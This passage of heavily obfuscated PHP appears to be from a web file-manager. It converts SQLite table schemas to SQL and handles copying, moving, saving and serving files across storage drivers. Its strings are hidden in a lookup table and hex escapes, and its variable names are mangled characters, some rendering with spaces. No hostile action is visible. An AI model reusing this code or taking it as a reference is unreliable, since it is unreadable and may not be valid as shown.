PHP_EOL, $ıƒ·ãÆ—), $´â­¸ß[1032]); $ÀÁ®›ÒØ = implode(PHP_EOL, array_merge($ãíÀ˜÷×, $®ÚÄ¡ş)); if ($º—‘´ÅĞ && $º—‘´ÅĞ == $´â­¸ß[13]) { return $ÀÁ®›ÒØ; } $æ¤ê›ë¹ = array($´â­¸ß[882] => $«ÅØù›¥, $´â­¸ß[13] => $ÀÁ®›ÒØ); return $º—‘´ÅĞ ? $æ¤ê›ë¹[$º—‘´ÅĞ] : $æ¤ê›ë¹; } public function sqlFromSqlite($û´Í¦«Â, $‹½÷Åã = '') { $í‚–è‰ç =& $_SERVER[¼¥ÊĞÙÌ]; $“áİ÷Ìö = $this->model()->db(); $ãÃâå”ü = "\x50\x52\x41\107\115\101\40\124\101\102\114\105\137\x49\x4e\x46\117\x20\50\x27{$û´Í¦«Â}\x27\51"; $ğÔ·È»€ = "\123\105\x4c\x45\x43\x54\x20\x2a\x20\106\122\117\x4d\40\163\161\x6c\151\x74\145\x5f\155\141\163\164\145\x72\x20\127\x48\x45\122\105\x20\164\142\x6c\137\x6e\141\155\145\x20\x3d\x20\47{$û´Í¦«Â}\x27"; $†˜¯¯¸ù = $“áİ÷Ìö->query($ãÃâå”ü); if (empty($†˜¯¯¸ù)) { $åÀÅä°  = array($í‚–è‰ç[882] => $í‚–è‰ç[12], $í‚–è‰ç[13] => $í‚–è‰ç[12]); return $‹½÷Åã ? $åÀÅä° [$‹½÷Åã] : $åÀÅä° ; } $„¤º°¶ø = $“áİ÷Ìö->query($ğÔ·È»€); $Ó¬¦Ï¶ = $¢™’­òµ = array(); foreach ($„¤º°¶ø as $Í´˜óÏ) { if ($Í´˜óÏ[$í‚–è‰ç[33]] == $í‚–è‰ç[359]) { $Ó¬¦Ï¶[] = $Í´˜óÏ[$í‚–è‰ç[1219]]; } else { $¢™’­òµ[$Í´˜óÏ[$í‚–è‰ç[32]]] = $Í´˜óÏ[$í‚–è‰ç[1219]]; } } $şƒ¡’ÜŸ = array_merge(array($í‚–è‰ç[1215] . $û´Í¦«Â . $í‚–è‰ç[121]), $Ó¬¦Ï¶, array_values($¢™’­òµ)); $şƒ¡’ÜŸ = implode($í‚–è‰ç[74] . PHP_EOL, $şƒ¡’ÜŸ) . $í‚–è‰ç[74]; if ($‹½÷Åã && $‹½÷Åã == $í‚–è‰ç[13]) { return $şƒ¡’ÜŸ; } $½Ëâƒë› = array(); foreach ($¢™’­òµ as $·Œåş‰Î => $Úñèñìö) { $·¨Ş³¹í = str_replace($í‚–è‰ç[1220] . $û´Í¦«Â . $í‚–è‰ç[11], $í‚–è‰ç[12], $·Œåş‰Î); $·¨Ş³¹í = str_replace($û´Í¦«Â . $í‚–è‰ç[11], $í‚–è‰ç[12], $·Œåş‰Î); $Ì§¡ø‰¡ = str_replace(array($í‚–è‰ç[121], $í‚–è‰ç[1043]), $í‚–è‰ç[464], substr($Úñèñìö, stripos($Úñèñìö, $í‚–è‰ç[340]))); $½Ëâƒë›[$·¨Ş³¹í] = $Ì§¡ø‰¡; } $¤ÛœÆ‘— = array(); $±„§–¦ó = array($í‚–è‰ç[1207] => $í‚–è‰ç[1221], $í‚–è‰ç[393] => $í‚–è‰ç[1222]); $È£ãŠ•Â = $şÈ…åğù = $í‚–è‰ç[12]; foreach ($†˜¯¯¸ù as $Í´˜óÏ) { if ($Í´˜óÏ[$í‚–è‰ç[57]] == $í‚–è‰ç[91]) { $È£ãŠ•Â = $Í´˜óÏ[$í‚–è‰ç[32]]; } $¸û°Ç = $Í´˜óÏ[$í‚–è‰ç[33]]; if ($¸û°Ç == $í‚–è‰ç[1223] && isset($½Ëâƒë›[$Í´˜óÏ[$í‚–è‰ç[32]]])) { $¸û°Ç = $í‚–è‰ç[1224]; } $¸šò©Øù = array($í‚–è‰ç[464] . $Í´˜óÏ[$í‚–è‰ç[32]] . $í‚–è‰ç[464], _get($±„§–¦ó, $¸û°Ç, $¸û°Ç), $Í´˜óÏ[$í‚–è‰ç[35]] == $í‚–è‰ç[91] ? $í‚–è‰ç[1212] : $í‚–è‰ç[1225] . $Í´˜óÏ[$í‚–è‰ç[56]], $Í´˜óÏ[$í‚–è‰ç[57]] == $í‚–è‰ç[91] ? $í‚–è‰ç[1226] : $í‚–è‰ç[12]); $¤ÛœÆ‘—[] = trim(implode($í‚–è‰ç[53], $¸šò©Øù)); } foreach ($½Ëâƒë› as $·¨Ş³¹í => $Ì§¡ø‰¡) { if ($·¨Ş³¹í == $í‚–è‰ç[1201]) { $¸óŞğ›â = $şÈ…åğù = $í‚–è‰ç[1227] . $È£ãŠ•Â . $í‚–è‰ç[1228]; } else { $¸óŞğ›â = (stripos($·¨Ş³¹í, $í‚–è‰ç[11]) ? $í‚–è‰ç[1229] : $í‚–è‰ç[12]) . ($í‚–è‰ç[1230] . $·¨Ş³¹í . $í‚–è‰ç[1231] . $Ì§¡ø‰¡); } $¤ÛœÆ‘—[] = $¸óŞğ›â; } if ($È£ãŠ•Â && !$şÈ…åğù) { $¤ÛœÆ‘— = array_merge(array($í‚–è‰ç[1227] . $È£ãŠ•Â . $í‚–è‰ç[1228]), $¤ÛœÆ‘—); } $¸ÄĞµİÑ = array($í‚–è‰ç[1232] . $û´Í¦«Â . $í‚–è‰ç[1233], $í‚–è‰ç[1234] . $û´Í¦«Â . $í‚–è‰ç[1235], implode($í‚–è‰ç[50] . PHP_EOL, $¤ÛœÆ‘—), $í‚–è‰ç[1236]); $†½È¥£Á = implode(PHP_EOL, $¸ÄĞµİÑ); if ($‹½÷Åã && $‹½÷Åã == $í‚–è‰ç[882]) { return $†½È¥£Á; } $åÀÅä°  = array($í‚–è‰ç[882] => $†½È¥£Á, $í‚–è‰ç[13] => $şƒ¡’ÜŸ); return $‹½÷Åã ? $åÀÅä° [$‹½÷Åã] : $åÀÅä° ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ª÷–‚¯, $Ã¦Şè”ã) { $ÈÕË¯… =& $_SERVER[¼¥ÊĞÙÌ]; $©›ïÆ×å = $Ã¦Şè”ã; $GLOBALS[$ÈÕË¯…[1237]] = $ÈÕË¯…[1238] . $ª÷–‚¯; Hook::trigger($ÈÕË¯…[1238] . $ª÷–‚¯ . $ÈÕË¯…[1239], $©›ïÆ×å); $ìøáÙ×® = self::driverMake($Ã¦Şè”ã[0]); if (!$ìøáÙ×®) { return !1; } if (method_exists($ìøáÙ×®, $ª÷–‚¯)) { $³ê™Õ‚Á = @call_user_func_array(array($ìøáÙ×®, $ª÷–‚¯), $Ã¦Şè”ã); } else { if (method_exists($ìøáÙ×®, $ÈÕË¯…[1240])) { $³ê™Õ‚Á = @call_user_func_array(array($ìøáÙ×®, $ª÷–‚¯), $Ã¦Şè”ã); } else { if (method_exists(self, $ª÷–‚¯)) { $³ê™Õ‚Á = @call_user_func_array(array(self, $ª÷–‚¯), $Ã¦Şè”ã); } else { $³ê™Õ‚Á = call_user_func_array(array(parent, $ª÷–‚¯), $Ã¦Şè”ã); } } } Hook::trigger($ÈÕË¯…[1238] . $ª÷–‚¯ . $ÈÕË¯…[1241], $©›ïÆ×å, $³ê™Õ‚Á); return $³ê™Õ‚Á; } public static function init($ĞõÏŠ¨¦) { return self::driverMake($ĞõÏŠ¨¦); } public static function copy($ŞŠÛ­å…, $…·Ñ ØÖ, $–ª˜ÏÛå = false, $ó„‘áĞ¼ = false) { return self::copyMoveStart($ŞŠÛ­å…, $…·Ñ ØÖ, $–ª˜ÏÛå, $_SERVER[¼¥ÊĞÙÌ][626], $ó„‘áĞ¼); } public static function move($Ü×Â§ñı, $úé²È¾ñ, $²êšù‚ = false, $™ƒñÏ¢Ù = false) { return self::copyMoveStart($Ü×Â§ñı, $úé²È¾ñ, $²êšù‚, $_SERVER[¼¥ÊĞÙÌ][628], $™ƒñÏ¢Ù); } public static function copyMoveChildren($±Ç°ëÉ¿, $—ğÔ±âÑ, $Ñ´ã„›ñ = "\x63\x6f\160\171", $¯Äüâ§‡ = REPEAT_REPLACE) { $–îÌñå =& $_SERVER[¼¥ÊĞÙÌ]; $Š…–àÌ¹ = $±Ç°ëÉ¿; $½˜¯Ü÷ = self::driverMake($±Ç°ëÉ¿); $áãŞƒİÄ = $½˜¯Ü÷->listPath($±Ç°ëÉ¿, !0); $öæ“Á”é = array_merge($áãŞƒİÄ[$–îÌñå[86]], $áãŞƒİÄ[$–îÌñå[85]]); foreach ($öæ“Á”é as $Ù©ïÚÊö) { self::copyMoveStart($Ù©ïÚÊö[$–îÌñå[87]], $—ğÔ±âÑ, $¯Äüâ§‡, $Ñ´ã„›ñ, !1); } if ($Ñ´ã„›ñ == $–îÌñå[628]) { self::remove($Š…–àÌ¹); } } private static function copyMoveStart($÷›Üá¿, $ÀÔáÌå, $˜–ºÍÒ“, $×¢¿äİ, $Ì¾²¤©Ç) { $®Ü£Œùò =& $_SERVER[¼¥ÊĞÙÌ]; $öÛï‚ÌÈ = array($÷›Üá¿, $ÀÔáÌå, $˜–ºÍÒ“, $Ì¾²¤©Ç); Hook::trigger($®Ü£Œùò[1238] . $×¢¿äİ . $®Ü£Œùò[1239], $öÛï‚ÌÈ); $äÑöÉ­² = self::copyMove($÷›Üá¿, $ÀÔáÌå, $˜–ºÍÒ“, $×¢¿äİ, $Ì¾²¤©Ç); Hook::trigger($®Ü£Œùò[1238] . $×¢¿äİ . $®Ü£Œùò[1241], $öÛï‚ÌÈ, $äÑöÉ­²); return $äÑöÉ­²; } public static function saveFile($‘âæ³‡‚, $´Ş˜½²Ì, $Ã¯€Æ§› = true) { $îíÃ¡ã€ =& $_SERVER[¼¥ÊĞÙÌ]; $Å¼Ê²Íè = self::info($´Ş˜½²Ì); $Õã÷ìò = self::driverMake($‘âæ³‡‚); $½†ñé»û = self::driverMake($´Ş˜½²Ì); $·û…Ïì• = !1; if ($½†ñé»û->pathParse[$îíÃ¡ã€[1242]]) { $·û…Ïì• = $½†ñé»û; $Ñª“ÍáÃ = $½†ñé»û->pathParse[$îíÃ¡ã€[1242]]; $½†ñé»û = self::driverMake($Ñª“ÍáÃ); } if ($Õã÷ìò->pathParse[$îíÃ¡ã€[1242]]) { $Çñıùñì = $Õã÷ìò->pathParse[$îíÃ¡ã€[1242]]; $Õã÷ìò = self::driverMake($Çñıùñì); } $— µ¹©™ = $½†ñé»û->pathFather($´Ş˜½²Ì); $ğ¿ôƒÍª = !0; if (!$Ã¯€Æ§› && self::driverIsSame($Õã÷ìò, $½†ñé»û)) { $ğ¿ôƒÍª = !1; } $ÙĞŒ’‘· = self::copyFile($Õã÷ìò, $‘âæ³‡‚, $½†ñé»û, $— µ¹©™, $Å¼Ê²Íè[$îíÃ¡ã€[32]], $ğ¿ôƒÍª); if ($·û…Ïì•) { $ÙĞŒ’‘· = $·û…Ïì•->getPathOuter($ÙĞŒ’‘·); } return $ÙĞŒ’‘·; } private static function copyMove($Æ’şÕïÕ, $†İ¿ïõÈ, $Ô•É”¼”, $ªÌşæ¸, $ÉÏà—ø– = false) { $œ„æ´–“ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Æ’şÕïÕ || $Æ’şÕïÕ == $œ„æ´–“[8] || !$†İ¿ïõÈ) { return !1; } ignore_timeout(); $‡ê’éô = self::driverMake($Æ’şÕïÕ); $îñµãó = self::driverMake($†İ¿ïõÈ); $×ÒŞ¦¦Š = $ªÌşæ¸ == $œ„æ´–“[628]; $ƒ·ôâÓË = !1; if ($îñµãó->pathParse[$œ„æ´–“[1242]]) { $ƒ·ôâÓË = $îñµãó; $†İ¿ïõÈ = $îñµãó->pathParse[$œ„æ´–“[1242]]; $îñµãó = self::driverMake($†İ¿ïõÈ); } if ($‡ê’éô->pathParse[$œ„æ´–“[1242]]) { $Æ’şÕïÕ = $‡ê’éô->pathParse[$œ„æ´–“[1242]]; $‡ê’éô = self::driverMake($Æ’şÕïÕ); } self::check($‡ê’éô, $Æ’şÕïÕ, $îñµãó, $†İ¿ïõÈ); Hook::trigger($œ„æ´–“[1243], $‡ê’éô, $Æ’şÕïÕ, $îñµãó, $†İ¿ïõÈ); $®‘÷ØŒ = self::driverIsSame($‡ê’éô, $îñµãó); if ($®‘÷ØŒ) { if ($ªÌşæ¸ == $œ„æ´–“[628] && !method_exists($îñµãó, $œ„æ´–“[1244]) && trim($†İ¿ïõÈ, $œ„æ´–“[8]) == trim($îñµãó->pathFather($Æ’şÕïÕ), $œ„æ´–“[8])) { if ($‡ê’éô->pathThis($Æ’şÕïÕ) != $ÉÏà—ø– && !$‡ê’éô->isOsDriver()) { return $‡ê’éô->rename($Æ’şÕïÕ, $ÉÏà—ø–); } return $îñµãó->getPathOuter($Æ’şÕïÕ); } if (method_exists($îñµãó, $ªÌşæ¸)) { return $îñµãó->{$ªÌşæ¸}($Æ’şÕïÕ, $†İ¿ïõÈ, $Ô•É”¼”, $ÉÏà—ø–); } } if ($®‘÷ØŒ && $ªÌşæ¸ == $œ„æ´–“[628] && $îñµãó->getType() == $œ„æ´–“[109]) { $ˆ”ßÖÌå = $îñµãó->movePath($Æ’şÕïÕ, $†İ¿ïõÈ, $ÉÏà—ø–); if ($ˆ”ßÖÌå) { return $ˆ”ßÖÌå; } } $ÓÅÉä£¯ = $‡ê’éô->isFile($Æ’şÕïÕ); if (!$ÓÅÉä£¯ && $îñµãó->getType() == $œ„æ´–“[831] && $‡ê’éô->getType() == $œ„æ´–“[109]) { $ˆ”ßÖÌå = $îñµãó->copyFolderFromIO($‡ê’éô, $Æ’şÕïÕ, $†İ¿ïõÈ, $Ô•É”¼”, $×ÒŞ¦¦Š, $ÉÏà—ø–); } else { $ˆ”ßÖÌå = self::copyPath($‡ê’éô, $Æ’şÕïÕ, $îñµãó, $†İ¿ïõÈ, $Ô•É”¼”, $×ÒŞ¦¦Š, $ÓÅÉä£¯, $ÉÏà—ø–); } if ($ˆ”ßÖÌå && $×ÒŞ¦¦Š) { $‡ê’éô->remove($Æ’şÕïÕ); } if ($ƒ·ôâÓË) { $ˆ”ßÖÌå = $ƒ·ôâÓË->getPathOuter($ˆ”ßÖÌå); } return $ˆ”ßÖÌå; } private static function check($‚š® î™, $–ˆ‘æâƒ, $âöÅèĞ«, &$‚© Ã‡) { $º› øøè =& $_SERVER[¼¥ÊĞÙÌ]; if (self::driverIsSame($‚š® î™, $âöÅèĞ«) && $‚š® î™->isFolder($–ˆ‘æâƒ) && $‚š® î™->isParentOf($–ˆ‘æâƒ, $‚© Ã‡)) { show_json(LNG($º› øøè[1245]), !1); } if (!$‚š® î™->exist($–ˆ‘æâƒ)) { show_json(LNG($º› øøè[108]), !1); } } private static function copyPath($¥µ—½Å¸, $¼Å¦„ó•, $¶û÷âº…, $¥±›ç“±, $¦Éœş€¼, $…¬³—Ú, $œîòÃÍ, $ğ«‚Å›ã = false, $ë™û©èœ = true) { $¡Õö¤½ =& $_SERVER[¼¥ÊĞÙÌ]; $ò¬×ø±İ = empty($ğ«‚Å›ã) && $ğ«‚Å›ã !== $¡Õö¤½[231] ? $¥µ—½Å¸->pathThis($¼Å¦„ó•) : $ğ«‚Å›ã; if ($¦Éœş€¼) { $¤¸¼©õğ = $¶û÷âº…->fileNameExist($¥±›ç“±, $ò¬×ø±İ); $ğ·÷µ‰ = $ò¬×ø±İ; $ò¬×ø±İ = $¶û÷âº…->fileNameAuto($¥±›ç“±, $ò¬×ø±İ, $¦Éœş€¼, !$œîòÃÍ); if (!$¤¸¼©õğ || $ğ·÷µ‰ != $ò¬×ø±İ) { $¦Éœş€¼ = !1; } if ($ë™û©èœ && !$¦Éœş€¼) { $¶û÷âº…->_data[$¡Õö¤½[1246]] = !0; } } if ($œîòÃÍ) { return self::copyFile($¥µ—½Å¸, $¼Å¦„ó•, $¶û÷âº…, $¥±›ç“±, $ò¬×ø±İ, $…¬³—Ú); } if ($¦Éœş€¼ == REPEAT_RENAME_FOLDER) { $¦Éœş€¼ = !1; } $¤Ê¶²·ı = rtrim($¥±›ç“±, $¡Õö¤½[8]) . $¡Õö¤½[8] . $ò¬×ø±İ; $ï»Ç†Ë‚ = $¶û÷âº…->mkdir($¶û÷âº…->getPath($¤Ê¶²·ı), $¦Éœş€¼); $¥±›ç“± = $¶û÷âº…->getPathInner($ï»Ç†Ë‚); $¾‰ış·ä = $¥µ—½Å¸->listPath($¼Å¦„ó•, !0); $¾‰ış·ä = is_array($¾‰ış·ä) ? $¾‰ış·ä : array($¡Õö¤½[86] => array(), $¡Õö¤½[85] => array()); $ŠÏÆó¾š = array_merge($¾‰ış·ä[$¡Õö¤½[86]], $¾‰ış·ä[$¡Õö¤½[85]]); foreach ($ŠÏÆó¾š as $õ·óÁú‚) { $øß¢ÚßÒ = $õ·óÁú‚[$¡Õö¤½[33]] == $¡Õö¤½[233]; $¼Å¦„ó• = $¥µ—½Å¸->getPathInner($õ·óÁú‚[$¡Õö¤½[87]]); $ø½°“ËÏ = self::copyPath($¥µ—½Å¸, $¼Å¦„ó•, $¶û÷âº…, $¥±›ç“±, $¦Éœş€¼, $…¬³—Ú, $øß¢ÚßÒ, !1, !1); if (!$ø½°“ËÏ) { IO::errorTips($¡Õö¤½[1247] . $¼Å¦„ó• . $¡Õö¤½[73] . $¥±›ç“±); } } self::copyMoveKeepInfo($¥µ—½Å¸, $¼Å¦„ó•, $ï»Ç†Ë‚); return $ï»Ç†Ë‚; } private static function copyFile($œ“°½Õ, $¶Öµ©ùš, $×š€øå€, $æÎáÅî®, $‘Ô¸²ä, $ôãÓ°¨) { $ØÊ«Ô©ä =& $_SERVER[¼¥ÊĞÙÌ]; $æÎáÅî® = $×š€øå€->getPath(rtrim($æÎáÅî®, $ØÊ«Ô©ä[8]) . $ØÊ«Ô©ä[8] . $‘Ô¸²ä); $„™ûšö— = $ØÊ«Ô©ä[1248] . time() . rand_string(5); Hook::trigger($ØÊ«Ô©ä[1249], $œ“°½Õ, $¶Öµ©ùš, $×š€øå€, $æÎáÅî®, $‘Ô¸²ä, $„™ûšö—); if (self::driverIsSame($œ“°½Õ, $×š€øå€)) { if ($ôãÓ°¨) { $­åËÜğ = $×š€øå€->moveFile($¶Öµ©ùš, $æÎáÅî®); } else { $­åËÜğ = $×š€øå€->copyFile($¶Öµ©ùš, $æÎáÅî®); } Hook::trigger($ØÊ«Ô©ä[1250], $œ“°½Õ, $¶Öµ©ùš, $×š€øå€, $æÎáÅî®, $‘Ô¸²ä, $­åËÜğ); self::copyMoveKeepInfo($œ“°½Õ, $¶Öµ©ùš, $­åËÜğ); return $­åËÜğ; } $¾–Õ˜§Ù = TEMP_FILES; if ($GLOBALS[$ØÊ«Ô©ä[6]][$ØÊ«Ô©ä[92]][$ØÊ«Ô©ä[872]]) { $¾–Õ˜§Ù = $GLOBALS[$ØÊ«Ô©ä[6]][$ØÊ«Ô©ä[92]][$ØÊ«Ô©ä[872]]; } $½Ù»ìí— = $¾–Õ˜§Ù; mk_dir($½Ù»ìí—); $ôİúË¨ = $½Ù»ìí— . $„™ûšö—; $À›æ¼Ô = $ôİúË¨; $ôİúË¨ = $œ“°½Õ->download($¶Öµ©ùš, $ôİúË¨); $ôİúË¨ = $œ“°½Õ->iconvApp($ôİúË¨); if (substr($ôİúË¨, strlen($¾–Õ˜§Ù)) == $¾–Õ˜§Ù) { $ôãÓ°¨ = !0; } $­åËÜğ = $×š€øå€->upload($æÎáÅî®, $ôİúË¨, $ôãÓ°¨); self::remove($À›æ¼Ô); Hook::trigger($ØÊ«Ô©ä[1250], $œ“°½Õ, $¶Öµ©ùš, $×š€øå€, $æÎáÅî®, $‘Ô¸²ä, $­åËÜğ); self::copyMoveKeepInfo($œ“°½Õ, $¶Öµ©ùš, $­åËÜğ); return $­åËÜğ; } private static function copyMoveKeepInfo($ğ¹Çêö¦, $“…Õáè, $áõ÷ŞáŒ) { if (!$áõ÷ŞáŒ) { return; } $·ğéç†é = $ğ¹Çêö¦->info($“…Õáè); if (!is_array($·ğéç†é)) { return; } IO::setModifyTime($áõ÷ŞáŒ, $·ğéç†é[$_SERVER[¼¥ÊĞÙÌ][88]]); } public static function pathFather($Ç“Ú¨Ì¼) { $î—„í = IO::init($Ç“Ú¨Ì¼); $Ëä¹óø = $î—„í->pathFather($î—„í->path); return $î—„í->getPathOuter($Ëä¹óø); } public static function fileOut($ôÜâ‰ÆÏ, $ˆŠŠ¤Ÿƒ = false, $ü‹…¶Şï = false, $¾çùà­Ï = '') { $©˜¶ãÁ× = self::driverMake($ôÜâ‰ÆÏ); if ($©˜¶ãÁ×->isFileOutServer()) { return $©˜¶ãÁ×->fileOutServer($ôÜâ‰ÆÏ, $ˆŠŠ¤Ÿƒ, $ü‹…¶Şï, $¾çùà­Ï); } return $©˜¶ãÁ×->fileOut($ôÜâ‰ÆÏ, $ˆŠŠ¤Ÿƒ, $ü‹…¶Şï, $¾çùà­Ï); } public static function fileOutImage($‰éşºÓ, $øÆ¹²¹ü = 250) { $ÖÂö—×Í = array(250, 600, 1200, 2000, 3000, 5000); for ($¯ˆ—Ï£ = 0; $¯ˆ—Ï£ < count($ÖÂö—×Í); $¯ˆ—Ï£++) { if ($¯ˆ—Ï£ == 0 && $øÆ¹²¹ü <= $ÖÂö—×Í[$¯ˆ—Ï£]) { $øÆ¹²¹ü = $ÖÂö—×Í[$¯ˆ—Ï£]; break; } else { if ($øÆ¹²¹ü > $ÖÂö—×Í[$¯ˆ—Ï£ - 1] && $øÆ¹²¹ü <= $ÖÂö—×Í[$¯ˆ—Ï£]) { $øÆ¹²¹ü = $ÖÂö—×Í[$¯ˆ—Ï£]; break; } else { if ($¯ˆ—Ï£ == count($ÖÂö—×Í) - 1 && $øÆ¹²¹ü > $ÖÂö—×Í[$¯ˆ—Ï£]) { $øÆ¹²¹ü = $ÖÂö—×Í[$¯ˆ—Ï£]; break; } } } } $•°¹¯é = self::driverMake($‰éşºÓ); if ($•°¹¯é->isFileOutServer()) { return $•°¹¯é->fileOutImageServer($‰éşºÓ, $øÆ¹²¹ü); } return $•°¹¯é->fileOutImage($‰éşºÓ, $øÆ¹²¹ü); } private static function driverIsSame($šµäÑÓ, $Ùİ©úÙ¬) { $„ËË¤¯¥ =& $_SERVER[¼¥ÊĞÙÌ]; $òÉª–Ş = $šµäÑÓ->getType(); $Ü‡«ËàŸ = $Ùİ©úÙ¬->getType(); if ($òÉª–Ş != $Ü‡«ËàŸ) { return !1; } if ($òÉª–Ş == $„ËË¤¯¥[831]) { return !0; } if ($òÉª–Ş == $„ËË¤¯¥[109]) { return !0; } if ($šµäÑÓ->pathDriver == $Ùİ©úÙ¬->pathDriver) { return !0; } return !1; } public static function copyUpdate($ıÃ›ê×§, $÷ÃïÙÚ¼) { $ÙËµ·°â =& $_SERVER[¼¥ÊĞÙÌ]; if (!IO::exist($ıÃ›ê×§)) { return !1; } if (!IO::exist($÷ÃïÙÚ¼)) { IO::mkdir($÷ÃïÙÚ¼); } $¹¼”¸ = array_to_keyvalue(self::listAllSimple($ıÃ›ê×§), $ÙËµ·°â[87]); $–šÜî¯ = array_to_keyvalue(self::listAllSimple($÷ÃïÙÚ¼), $ÙËµ·°â[87]); $©¿ĞÌš’ = array(); $ÎÔÕ¼œà = array(); foreach ($¹¼”¸ as $ÙúİâÈö => $¥ˆÑºîÛ) { if (isset($–šÜî¯[$ÙúİâÈö])) { if ($¥ˆÑºîÛ[$ÙËµ·°â[78]] == 1) { continue; } if ($–šÜî¯[$ÙúİâÈö][$ÙËµ·°â[79]] == $¥ˆÑºîÛ[$ÙËµ·°â[79]]) { continue; } } if ($¥ˆÑºîÛ[$ÙËµ·°â[78]] == 1) { $ÎÔÕ¼œà[] = $÷ÃïÙÚ¼ . $ÙËµ·°â[8] . trim($ÙúİâÈö, $ÙËµ·°â[8]); continue; } $ˆş½şßÚ = strstr(trim($ÙúİâÈö, $ÙËµ·°â[8]), $ÙËµ·°â[8]) ? get_path_father($ÙúİâÈö) : $ÙËµ·°â[12]; $©¿ĞÌš’[] = array($ÙËµ·°â[1251] => $¥ˆÑºîÛ[$ÙËµ·°â[89]], $ÙËµ·°â[1252] => rtrim($÷ÃïÙÚ¼, $ÙËµ·°â[8]) . $ÙËµ·°â[8] . $ˆş½şßÚ, $ÙËµ·°â[1253] => $¥ˆÑºîÛ); } $Ç–º´ìß = array($ÙËµ·°â[233] => $©¿ĞÌš’, $ÙËµ·°â[78] => $ÎÔÕ¼œà); Hook::trigger($ÙËµ·°â[1254], $ıÃ›ê×§, $÷ÃïÙÚ¼, $Ç–º´ìß); foreach ($ÎÔÕ¼œà as $¥ˆÑºîÛ) { IO::mkdir($¥ˆÑºîÛ); } foreach ($©¿ĞÌš’ as $¥ˆÑºîÛ) { IO::copy($¥ˆÑºîÛ[$ÙËµ·°â[1251]], $¥ˆÑºîÛ[$ÙËµ·°â[1252]], REPEAT_REPLACE); } } public static function fileSubstr($ÖøªÏÄç, $°ØËª»å, $êå‚’¬ = false) { $âõŸŒ·© =& $_SERVER[¼¥ÊĞÙÌ]; $™òÚù‹Â = self::driverMake($ÖøªÏÄç); $¿ÀïÈÂ = $™òÚù‹Â->size($ÖøªÏÄç); $àÛ¸àÎÕ = $°ØËª»å; $½ûŸ¯ = $êå‚’¬; if ($°ØËª»å < 0) { $°ØËª»å = $¿ÀïÈÂ + $°ØËª»å; } if ($êå‚’¬ === !1) { $êå‚’¬ = $¿ÀïÈÂ - $°ØËª»å; } if ($°ØËª»å + $êå‚’¬ > $¿ÀïÈÂ) { $êå‚’¬ = $¿ÀïÈÂ - $°ØËª»å; } if (!$¿ÀïÈÂ && $™òÚù‹Â->getType() == $âõŸŒ·©[109] && !$™òÚù‹Â->exist($ÖøªÏÄç)) { $ƒëú‡º = get_path_this($ÖøªÏÄç); $Æ§ÇÚš³ = parse_url_query($ƒëú‡º); if (is_array($Æ§ÇÚš³) && isset($Æ§ÇÚš³[$âõŸŒ·©[32]])) { $ƒëú‡º = urldecode($Æ§ÇÚš³[$âõŸŒ·©[32]]); } throw new Exception($âõŸŒ·©[1255] . LNG($âõŸŒ·©[1256]) . $âõŸŒ·©[1052] . clear_html($ƒëú‡º) . $âõŸŒ·©[12]); } if ($êå‚’¬ <= 0) { return $âõŸŒ·©[12]; } if ($°ØËª»å < 0 || $°ØËª»å >= $¿ÀïÈÂ || $êå‚’¬ > $GLOBALS[$âõŸŒ·©[6]][$âõŸŒ·©[92]][$âõŸŒ·©[1257]]) { throw new Exception("\146\x69\154\145\122\x65\x61\144\40\x65\162\x72\x6f\x72\54\x6f\166\x65\162\x20\x69\x6f\x52\145\x61\x64\115\141\x78\41\40\163\x74\x61\x72\164\75{$°ØËª»å}\73\x6c\145\x6e\x67\164\x68\x3d{$êå‚’¬}\x3b\x20\x73\x69\x7a\145\x3d{$¿ÀïÈÂ}\x3b"); } $Òêç­›” = $™òÚù‹Â->fileSubstr($ÖøªÏÄç, $°ØËª»å, $êå‚’¬); if (!$Òêç­›” && $êå‚’¬ && isset($GLOBALS[$âõŸŒ·©[1258]])) { throw new Exception($GLOBALS[$âõŸŒ·©[1258]][$âõŸŒ·©[1259]]); } return $Òêç­›”; } private static function driverMake(&$Ã˜´¯ªî) { $İŸ–™é =& $_SERVER[¼¥ÊĞÙÌ]; $•Àªõ•Ø = KodIO::parse($Ã˜´¯ªî); if (!self::$driverListSystem) { $Ÿàë—– = Model($İŸ–™é[841])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ÿàë—–, $İŸ–™é[478]); } if ($•Àªõ•Ø[$İŸ–™é[33]] == KodIO::KOD_IO && !self::$driverListSystem[$•Àªõ•Ø[$İŸ–™é[478]]]) { throw new Exception($İŸ–™é[1260]); return !1; } $Ã˜´¯ªî = $•Àªõ•Ø[$İŸ–™é[1261]]; $òâ£ñ’Õ = self::driverGet($•Àªõ•Ø, $Ã˜´¯ªî); return $òâ£ñ’Õ; } private static function driverGet($û…ß¶, &$Æ¢Ä†®‹) { $âÓ¸¨¶ˆ =& $_SERVER[¼¥ÊĞÙÌ]; $± Áİîã = $û…ß¶[$âÓ¸¨¶ˆ[1262]]; $È¨¢×Ç— = $û…ß¶[$âÓ¸¨¶ˆ[478]]; switch ($û…ß¶[$âÓ¸¨¶ˆ[33]]) { case KodIO::KOD_IO: $üˆÂ“İÊ = self::$driverListSystem[$È¨¢×Ç—]; break; case KodIO::KOD_SOURCE: $Æ¢Ä†®‹ = $È¨¢×Ç— . $Æ¢Ä†®‹; $üˆÂ“İÊ = array($âÓ¸¨¶ˆ[1263] => $âÓ¸¨¶ˆ[1264], $âÓ¸¨¶ˆ[6] => $û…ß¶); $üˆÂ“İÊ[$âÓ¸¨¶ˆ[6]][$âÓ¸¨¶ˆ[1265]] = $û…ß¶[$âÓ¸¨¶ˆ[478]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ô‰ãĞ›Ì = $GLOBALS[$âÓ¸¨¶ˆ[1266]]; self::$driverListUser = array_to_keyvalue($Ô‰ãĞ›Ì, $âÓ¸¨¶ˆ[478]); } $üˆÂ“İÊ = self::$driverListUser[$È¨¢×Ç—]; break; case KodIO::KOD_SHARE_LINK: $üˆÂ“İÊ = array($âÓ¸¨¶ˆ[1263] => $âÓ¸¨¶ˆ[1267], $âÓ¸¨¶ˆ[6] => $û…ß¶); $çœÎ…™„ = Action($âÓ¸¨¶ˆ[1268])->sharePathInfo($û…ß¶[$âÓ¸¨¶ˆ[87]]); $Æ¢Ä†®‹ = $çœÎ…™„[$âÓ¸¨¶ˆ[194]]; if (!$çœÎ…™„[$âÓ¸¨¶ˆ[194]]) { $¬™æğ¥™ = Model($âÓ¸¨¶ˆ[672])->getInfo($çœÎ…™„[$âÓ¸¨¶ˆ[673]]); 